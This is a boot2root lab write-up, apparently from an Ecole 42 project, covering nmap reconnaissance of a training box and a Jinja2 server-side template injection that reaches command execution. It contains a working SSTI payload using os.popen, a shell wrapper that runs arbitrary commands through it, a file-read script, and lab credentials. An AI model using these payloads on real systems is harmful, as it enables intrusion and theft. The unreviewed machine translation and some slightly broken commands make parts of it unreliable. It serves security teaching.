# WRITEUP 2 - Boot2Root - Web Vulnerability #2 - Server Side Template Injection (SSTI)

> [!CAUTION]
> This WriteUp was AI translated from the french WriteUp version, as I am exhausted with this project, i did not took time to review.

## Context: HAL9042 Box, educational project of Ecole 42
> [!NOTE]
> WriteUp1 & WriteUp2 are written from a troubleshooting README.md that I tried to keep updated as I worked on the box.  

**Summary table of the attacked application:**
  
| Category              | Element                                        | Details / Values found                                                               |
|------------------------|------------------------------------------------|------------------------------------------------------------------------------------------|
| **General Information** | System Name                                    | HAL9042 - Evaluation Server (v0.4)                                                       |
|                        | Environment                                    | `env=development`                                                                        |
|                        | Operating System                               | Ubuntu                                                                                   |
| **Network & IP**       | Server IP Address                              | 10.0.2.2                                                                                 |
| **Ports & Services**   | Port 5042                                      | HTTP Web Service (HAL9042 Evaluation Server)                                             |
|                        | Port 6060                                      | SSH Service                                                                              |
|                        | Port 8000 (int)                                | Python/Gunicorn Application on `127.0.0.1:8000`                                         |
|                        | Port 7042 (int)                                | Local evaluation daemon `hal9042d` on `127.0.0.1:7042`                                   |
| **Web Technologies**   | Software Stack                                 | Python3, Flask, Jinja2, Gunicorn                                                         |
|                        | Application Directory                          | `/var/www/hal9042/` (which contains `app.py`, `config.py`, `venv/`)                        |
| **Endpoints & Routes** | Public Routes                                  | `/`, `/status`, `/feed`, `/evaluate`, `/appeals`, `/about`, `/update`                      |
|                        | Debug Endpoints & Files                        | `/api/debug` (Local File Inclusion + Command Execution), `static/js/debug.js`            |
|                        | Specific HTTP Header                           | `X-Debug-Render: true` (allows rendering Jinja2 template injection on `/evaluate`)       |
| **System Users**       | Bash User Accounts                             | `paco`, `wil`, `sophie`, `ol`                                                            |
|                        | Dedicated / Service Accounts                   | `root`, `hal`, `halrev`                                                                  |
|                        | Deleted User Account                           | `xavier` (uid 1337)                                                                      |
| **Secrets & Credentials** | API Maintenance Token                       | `h4l_d3bug_t0k3n_2024`                                                                   |
|                        | Flask Secret Key                               | `hal9042secret`                                                                          |
|                        | SSH ID                                         | `paco` : `Pac0_H4L_dev!`                                                                 |
|                        | SSH Passphrase `sophie`                        | `iloveyou` (file: `id_rsa_sophie.enc`)                                                   |
|                        | `.key_part`:`ol`                               | `M0ul1n3tt3`                                                                             |
|                        | `.key_part`:`wil`                              | `847_4n0m4l13s`                                                                          |
|                        | `.key_part`:`sophie`                           | `S0ph13_J14`                                                                             |
|                        | `.key_part`:`xavier`                           | `uid1337`                                                                                |
|                        | AES-256 Key to decrypt `rapport_final.enc`     | `380f5c29228093385507c1a9e351610a9144105e358e35abb8539250c033b44e`                       |


### PHASE 1 - Reconnaissance / Enumeration:
---
#### 1. ARP
```bash
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ arp -a
? (10.0.2.2) at 52:54:00:12:35:02 [ether] on eth0
c2r3p4.42lehavre.fr (10.12.3.4) at 00:be:43:89:f2:1d [ether] on eth1
```
---
#### 2. NMAP
```bash
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ nmap -p- 10.0.2.2
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-21 11:31 EDT
Nmap scan report for 10.0.2.2
Host is up (0.00012s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
111/tcp   open  rpcbind
1337/tcp  open  waste
2049/tcp  open  nfs
4242/tcp  open  vrml-multi-use
4444/tcp  open  krb524
5042/tcp  open  asnaacceler8db
6060/tcp  open  x11
6379/tcp  open  redis
9100/tcp  open  jetdirect
11434/tcp open  unknown
36965/tcp open  unknown
37643/tcp open  unknown
41295/tcp open  unknown
46583/tcp open  unknown
47129/tcp open  unknown
60675/tcp open  unknown
MAC Address: 52:54:00:12:35:02 (QEMU virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 5.77 seconds
```

```bash
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ nmap -sV -p 22,111,1337,2049,4242,5042,6060,6379,9100,11434,36965,37643,41295,46583,47129,60675 10.0
.2.2
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-21 11:33 EDT
Nmap scan report for 10.0.2.2
Host is up (0.0017s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
111/tcp   open  rpcbind    2-4 (RPC #100000)
1337/tcp  open  http       Golang net/http server
2049/tcp  open  nfs_acl    3 (RPC #100227)
4242/tcp  open  http       WSGIServer 0.2 (Python 3.10.12)
5042/tcp  open  http       nginx 1.24.0 (Ubuntu)
6060/tcp  open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
6379/tcp  open  redis      Redis key-value store 6.0.16
9100/tcp  open  jetdirect?
11434/tcp open  http       Golang net/http server
36965/tcp open  fmproduct  1-4 (RPC #1073741824)
37643/tcp open  nlockmgr   1-4 (RPC #100021)
41295/tcp open  mountd     1-3 (RPC #100005)
46583/tcp open  status     1 (RPC #100024)
47129/tcp open  mountd     1-3 (RPC #100005)
60675/tcp open  mountd     1-3 (RPC #100005)
```

**What the scans reveal:** 
| Port   | Service          | Interest                                                 |
|--------|------------------|----------------------------------------------------------|
| `22`     | OpenSSH 8.9 SSH  | **No:** Classic SSH Access                                 |
| `111`    | rpcbind          | **No:** Tested, no NFS interest                            |
| `1337`   | Go HTTP          | **Yes:** No permissions for now, but keep in mind        |
| `2049`   | NFS              | **No:** showmount gives no export                          |
| `4242`   | Python WSGI HTTP | **Yes:** `{{'ftpkg-srv'}}` => ? To check                 |
| `5042`   | nginx -> HTTP    | **Yes:** HAL9042 Application                               |
| `6060`   | OpenSSH SSH      | **Yes:** User SSH Service                                  |
| `6379`   | Redis            | **Yes**                                                  |
| `11434`  | Go HTTP          | **Yes**                                                  |
| `36965+` | RPC/mountd/nlock | **No:** linked with NFS but nothing to dig here            |
*Thanks: [TableGenerator](https://www.tablesgenerator.com/markdown_tables)*  

#### 3. SMTP : 
```bash
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ sudo nmap -p 25 --script smtp-enum-users 10.0.2.2          
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-21 12:07 EDT
Nmap scan report for 10.0.2.2
Host is up (0.00023s latency).

PORT   STATE  SERVICE
25/tcp closed smtp
MAC Address: 52:54:00:12:35:02 (QEMU virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
```  
Source : [geeksforgeeks](https://www.geeksforgeeks.org/ethical-hacking/smtp-enumeration/0)

#### 4. DNS : 
```bash
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ nmap -sSU -p 53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=example.com 10.0.2.2 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-21 12:11 EDT
Nmap scan report for 10.0.2.2
Host is up (0.00022s latency).

PORT   STATE         SERVICE
53/tcp closed        domain
53/udp open|filtered domain
| dns-nsec-enum: 
|_  No NSEC records found
MAC Address: 52:54:00:12:35:02 (QEMU virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
```
---

### UTILITIES 

The user enumeration phase required the following scripts: (made possible by the vulnerabilities exposed below)  

#### 1. `get_file.sh`
- Allows viewing a file's content as long as its path is known (executed with the privileges of `/var/www/hal9042`).

```bash
#!/bin/bash

if [ "$#" -eq 0 ]; then
    echo "Usage: $0 \"<file_path>\""
    exit 1
fi

FILE="$*"

curl "http://10.0.2.2:5042/api/debug?file=$FILE"
```

#### 2. `post_evaluate.sh`
- To be filled
```bash
#!/bin/bash

if [ "$#" -eq 0 ]; then
    echo "Usage: $0 \"shell command\""
    exit 1
fi

COMMAND="$*"

# if you reuse this, make sure to modify the ip
curl -s -X POST http://10.0.2.2:5042/evaluate \
    -H "X-Debug-Render: true" \
    --data-urlencode "project_name={{ \"\".__class__.__mro__[1].__subclasses__()[540].__init__.__globals__[\"os\"].popen(\"$COMMAND\").read() }}"
```
---

### PHASE 2 - Attack on http://10.0.2.2:5042/evaluate  
#### A. Server Side Template Injection (SSTI)

In the source code of `app.py` this comment :  
```html
<!-- debug.js still in /static/js pls remove -->
```  
Invites us to look at the content of this file.
```js
┌──(kali㉿kali)-[~]
└─$ curl http://10.0.2.2:5042/api/debug?file=static/js/debug.js
// static/js/debug.js
// paco: internal debug helper. NEVER linked from any template — leftover.
// (found via the exposed .git repo or by dirbusting /static/js/)
window.HAL_DEBUG = {
    // Setting this request header switches /evaluate into verbose render mode,
    // so the Jinja2-rendered output is returned instead of the opaque ack.
    debug_header: "X-Debug-Render",
    schema_endpoint: "/api/internal/schema",
    // legacy maintenance console — disabled in the UI, still on the server
    debug_endpoint: "/api/debug",
    note: "X-Debug-Render: true  ->  see what the template engine actually rendered"
};
```

1. Combined with reading `app.py`, we understand that a vulnerability exists on `Jinja2`. It is a templating engine used to generate `html` pages.  
2. **The idea** : `<Template prep> + <user input> = complete generated page` :
```json
Template : "Project under evaluation: {{name}}"
User input : "Minishell"
Generated html page : "Project under evaluation: Minishell"
```
3. **In `app.py`** :
```python
name = request.form.get("project_name", "") or request.args.get("project_name", "")
```  
`name` directly contains the user input.
4. **The vulnerability** :
```python
render_template_string("Project under evaluation" + name)
```
```
"Project under evaluation" + <user_input> => New template => render_template_string()
```  
  
The [PortSwigger](https://portswigger.net/web-security/server-side-template-injection) article on `SSTIs` describes this pattern: *user input is concatenated with a string that then becomes the template interpreted by the engine*.

5. `Jinja2` has a syntax that we must respect to ask the engine to evaluate an expression: `{{ ... }}`. [Source](https://jinja.palletsprojects.com/en/stable/templates/)

6. **Confirmation of the vulnerability** : Let's play the basic test given in the previously cited PortSwigger article:  
```bash
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://10.0.2.2:5042/evaluate \
-H "X-Debug-Render: true" \
-d "project_name={{7*7}}"
Project under evaluation: 49
```
> [!TIP] 
> *It is essential to set `X-Debug-Render` to `true` so that the rendering result can be observed*

7. **Class Traversal + RCE** : 
- To move from simple expression evaluation to system code execution, we rely on Python POO reflection.
    - **Access to parent class** : Using MRO (Method Resolution Order) from a basic instance like `str` to go back up to the root class `object` : `''.__class__.__mro__[1]`
    - **Enumeration of subclasses** : Inspection of all subclasses via `__subclasses__()`
    - **Identification of execution vector** : `subprocess.Popen` = vect 540
    - **Command execution** : Exploitation of the `__globals__` dictionary to access `os` and execute system commands via `os.popen()`
8. **Final RCE** :
```bash
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://10.0.2.2:5042/evaluate   
-H "X-Debug-Render: true"
--data-urlencode "project_name={{ ''.__class__.__mro__[1].__subclasses__()[540].__init__.__globals__['os'].popen('whoami').read() }}"
Project under evaluation: www-data
```
```
Request explanation: 

''.__class__   = str
__mro[1]__     = object (allows searching class order after enumeration)
__subclasses__ = All python classes
[INDEX]        = 540 for popen
__init__       = module init function
__globals__    = global dictionary
popen()        = system process
read()         = reads popen() output
```
> [!NOTE] 
> *Details of the search process are available in the log book [here](../utils/LOG_BOOK.md)*